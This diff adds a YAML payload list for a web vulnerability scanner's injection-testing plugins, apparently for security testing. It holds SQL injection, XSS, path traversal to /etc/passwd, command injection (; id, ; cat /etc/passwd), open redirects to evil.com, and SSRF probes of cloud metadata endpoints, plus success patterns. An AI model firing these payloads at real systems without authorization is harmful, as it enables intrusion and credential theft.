@@ -1,0 +1,129 @@
+# External payloads for injection testing plugins.
+# Add new payloads here — no code changes needed.
+# Plugins load this file at runtime.
+
+sqli:
+  error_based:
+    - "'"
+    - "\""
+    - "' OR '1'='1"
+    - "\" OR \"1\"=\"1"
+    - "1' OR 1=1 --"
+    - "1 OR 1=1"
+    - "' UNION SELECT NULL--"
+    - "1; SELECT 1"
+    - "' AND 1=CONVERT(int,(SELECT @@version))--"
+  time_based:
+    - "' OR SLEEP(5)--"
+    - "1; WAITFOR DELAY '0:0:5'--"
+    - "' OR pg_sleep(5)--"
+  boolean_based:
+    - "' AND '1'='1"
+    - "' AND '1'='2"
+    - "1 AND 1=1"
+    - "1 AND 1=2"
+
+xss:
+  reflected:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg/onload=alert('XSS')>"
+    - "'\"><script>alert('XSS')</script>"
+    - "<body onload=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "<iframe src='javascript:alert(`XSS`)'>"
+  dom_based:
+    - "#<img src=x onerror=alert(1)>"
+    - "#<svg/onload=alert(1)>"
+  header_based:
+    - "<script>alert('XSS')</script>"
+
+lfi:
+  unix:
+    - "../../../../../../etc/passwd"
+    - "....//....//....//....//etc/passwd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "..%252f..%252f..%252fetc/passwd"
+    - "/etc/passwd"
+    - "php://filter/convert.base64-encode/resource=/etc/passwd"
+    - "php://input"
+  windows:
+    - "..\\..\\..\\..\\windows\\win.ini"
+    - "....\\....\\....\\windows\\win.ini"
+    - "C:\\windows\\win.ini"
+
+lfi_success_patterns:
+  unix:
+    - "root:x:0:0"
+    - "daemon:"
+    - "/bin/bash"
+    - "/bin/sh"
+  windows:
+    - "[fonts]"
+    - "[extensions]"
+    - "[Mail]"
+
+command_injection:
+  unix:
+    - "; id"
+    - "| id"
+    - "& id"
+    - "$(id)"
+    - "`id`"
+    - "; cat /etc/passwd"
+    - "| whoami"
+  windows:
+    - "& dir"
+    - "| dir"
+    - "; dir"
+    - "& whoami"
+    - "| whoami"
+  success_patterns:
+    - "uid="
+    - "gid="
+    - "root:x:0"
+    - "Volume Serial Number"
+    - "Directory of"
+
+open_redirect:
+  payloads:
+    - "https://evil.com"
+    - "//evil.com"
+    - "///evil.com"
+    - "https:evil.com"
+    - "/\\evil.com"
+    - "////evil.com/%2F.."
+  parameter_names:
+    - "url"
+    - "redirect"
+    - "next"
+    - "return"
+    - "returnTo"
+    - "goto"
+    - "destination"
+    - "redir"
+    - "redirect_uri"
+    - "continue"
+    - "target"
+    - "link"
+
+ssrf:
+  payloads:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://127.0.0.1"
+    - "http://localhost"
+    - "http://0.0.0.0"
+    - "http://[::1]"
+    - "http://169.254.169.254/computeMetadata/v1/"
+  parameter_names:
+    - "url"
+    - "uri"
+    - "path"
+    - "src"
+    - "source"
+    - "dest"
+    - "redirect"
+    - "img"
+    - "image"
+    - "link"
+    - "feed"
